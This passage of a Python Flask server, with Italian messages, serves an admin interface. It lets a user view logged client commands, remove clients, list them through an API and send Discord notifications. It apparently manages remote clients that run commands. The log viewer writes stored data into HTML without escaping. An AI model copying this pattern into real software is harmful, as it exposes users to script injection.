        '''.format(CURRENT_VERSION, files_list)
    except Exception as e:
        return "<h2>Errore caricamento log: {}</h2>".format(str(e))

@app.route('/view_log/<log_filename>')
def view_single_log(log_filename):
    """Visualizza singolo log"""
    try:
        filepath = os.path.join("results", log_filename)
        
        if not os.path.exists(filepath):
            return "<h2>File non trovato: {}</h2>".format(log_filename)
        
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        formatted_json = json.dumps(data, indent=2, ensure_ascii=False)
        
        client_id = data.get('client_id', 'N/A')
        command = data.get('command', 'N/A')
        timestamp = data.get('timestamp', time.time())
        dt = datetime.fromtimestamp(timestamp)
        
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Log: {}</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                pre {{ background: #f5f5f5; padding: 15px; border-radius: 5px; overflow: auto; max-height: 80vh; }}
                .info {{ background: #e8f4fc; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                a {{ color: #007bff; text-decoration: none; }}
            </style>
        </head>
        <body>
            <h1>📄 Log: {}</h1>
            
            <div class="info">
                <p><strong>Client ID:</strong> {}</p>
                <p><strong>Comando:</strong> <code>{}</code></p>
                <p><strong>Data/Ora:</strong> {}</p>
                <p><strong>Dimensione:</strong> {:.1f} KB</p>
                <p><a href="/logs">⬅ Torna alla lista log</a> | <a href="/admin">📋 Admin Panel</a></p>
            </div>
            
            <h3>Contenuto JSON:</h3>
            <pre>{}</pre>
        </body>
        </html>
        '''.format(
            log_filename,
            log_filename,
            client_id,
            command,
            dt.strftime('%Y-%m-%d %H:%M:%S'),
            os.path.getsize(filepath) / 1024,
            formatted_json
        )
        
    except Exception as e:
        return "<h2>Errore lettura file: {}</h2>".format(str(e))

@app.route('/api/remove_client', methods=['POST'])
def remove_client_endpoint():
    try:
        client_id = request.form.get('client_id')
        
        if not client_id:
            return "Errore: client_id mancante", 400
        
        client_manager.remove_client(client_id)
        
        send_to_discord("🗑️ Client `{}` rimosso manualmente".format(client_id))
        
        return '''
        <h3>Client Rimosso!</h3>
        <p>Il client è stato rimosso dal sistema.</p>
        <p><a href="/admin">Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/api/clients', methods=['GET'])
def list_clients_api():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "count": len(clients),
        "clients": clients,
        "server_version": CURRENT_VERSION
    })

# ============================================
# 🏁 AVVIO SERVER
# ============================================
if __name__ == '__main__':
    def cleanup_loop():
        while True:
            time.sleep(3600)
            try:
                cleanup_old_files()
            except:
                pass
    
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    send_to_discord("🚀 **Server v{} avviato su PythonAnywhere**".format(CURRENT_VERSION))
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
